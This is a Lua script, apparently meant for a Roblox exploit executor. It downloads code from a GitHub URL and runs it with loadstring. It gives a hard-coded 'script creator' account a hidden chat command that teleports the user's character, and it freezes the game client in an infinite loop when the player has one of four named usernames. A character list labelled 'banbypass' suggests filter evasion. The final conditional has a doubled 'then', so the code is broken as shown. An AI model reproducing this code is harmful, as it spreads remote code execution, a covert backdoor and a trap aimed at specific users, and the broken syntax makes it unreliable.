repeat
    task.wait()
until game:GetService("Players").LocalPlayer

local ids = {
    5050653591
}

local banbypass = {
    "а",
    "q",
    "x",
    "й",
    "こ"
}

local notifs
task.spawn(
    function()
        notifs = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua"))()
        game:GetService("Players").PlayerAdded:Connect(
            function(plr)
                if table.find(ids,plr.UserId) then
                    plr.Chatted:Connect(
                        function(msg)
                            if msg == "tpback" then
                                local oldpos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
                                local plrpos = plr.Character.HumanoidRootPart.CFrame
                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
                                task.wait(3)
                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                            end
                        end
                    )
                    notifs.alert("script creator (szze) joined", nil, 10)
                    notifs.alert("be sure to say hi to cvrsxd", nil, 10, "rainbow")
                end
            end
        )

        for i, plr in next, game:GetService("Players"):GetPlayers() do
            if table.find(ids,plr.UserId) then
                plr.Chatted:Connect(
                    function(msg)
                        if msg == "tpback" then
                            local oldpos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
                            local plrpos = plr.Character.HumanoidRootPart.CFrame
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
                            task.wait(3)
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                        end
                    end
                )
                notifs.alert("script creator (szze) is in the server", nil, 10)
                notifs.alert("be sure to say hi to cvrsxd", nil, 10, "rainbow")
            end
        end

        if
            game:GetService("Players").LocalPlayer.Name == "AlexDaSlender1" or
            game:GetService("Players").LocalPlayer.Name == "tiki_hell" or
            game:GetService "Players".LocalPlayer.Name == "cat_cathuge1234567" or
            game:GetService'Players'.LocalPlayer.Name == 'Kuba33844' then
         then
            task.wait(1)
            while true do
            end
        end
    end
)
